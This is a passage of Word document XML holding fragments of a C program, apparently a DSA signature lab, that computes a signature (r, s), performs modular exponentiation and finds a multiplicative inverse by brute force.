        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>eInverse(k,q,p);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>nv * (hash + x * r) % q;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ay</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n*********C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-25"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ues*********");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%d",g);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>ny</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%d",y);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nGene</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gna</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Sender = (%d, %d) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>,s);</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i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>power(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>x, uns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gned </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">res = 1;    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze resu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="540" w:lineRule="atLeast"/>
        <w:ind w:left="340" w:right="3941"/>
      </w:pPr>
      <w:r>
        <w:t>x =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">x % p; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Upda</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">x </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ore</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han or equal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o p </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e (y &gt; 0)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="580" w:right="5434"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">If y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s odd, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y x w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h resu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f (y &amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="820"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>res =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>(res * x) % p;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ust</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be even</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580" w:right="6553"/>
      </w:pPr>
      <w:r>
        <w:t>y =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y &gt;&gt; 1;   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>y =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>2 x =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(x * x) % p;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn res;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>veIn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>erse(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">a, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">b, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>,x,y;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>y&lt;n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>y++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1060"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
